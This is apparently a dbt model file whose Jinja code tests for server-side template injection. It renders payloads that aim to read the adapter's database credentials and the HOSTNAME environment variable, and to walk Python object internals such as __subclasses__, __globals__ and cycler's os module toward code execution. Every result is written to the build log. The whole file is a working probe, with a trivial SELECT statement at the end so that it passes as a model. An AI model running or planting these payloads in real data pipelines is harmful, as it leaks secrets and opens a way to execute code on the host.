{% set test1 = render("{{ 7 * 7 }}") %}
{{ log("RENDER_7x7=" ~ test1, info=True) }}

{% set test2 = render("{{ adapter.config.credentials.database }}") %}
{{ log("RENDER_DB=" ~ test2, info=True) }}

{% set test3 = render("{{ env_var('HOSTNAME') }}") %}
{{ log("RENDER_HOST=" ~ test3, info=True) }}

{% set ssti1 = render("{{ ''.__class__.__mro__[1].__subclasses__() }}") %}
{{ log("SSTI_SUBCLASS=" ~ (ssti1 | string)[:200], info=True) }}

{% set ssti2 = render("{{ config.__class__.__init__.__globals__ }}") %}
{{ log("SSTI_GLOBALS=" ~ (ssti2 | string)[:200], info=True) }}

{% set ssti3 = render("{{ lipsum.__globals__ }}") %}
{{ log("SSTI_LIPSUM=" ~ (ssti3 | string)[:200], info=True) }}

{% set ssti4 = render("{{ cycler.__init__.__globals__.os }}") %}
{{ log("SSTI_CYCLER_OS=" ~ (ssti4 | string)[:200], info=True) }}

{% set ssti5 = render("{{ namespace.__init__.__globals__ }}") %}
{{ log("SSTI_NS=" ~ (ssti5 | string)[:200], info=True) }}

SELECT 1 as id
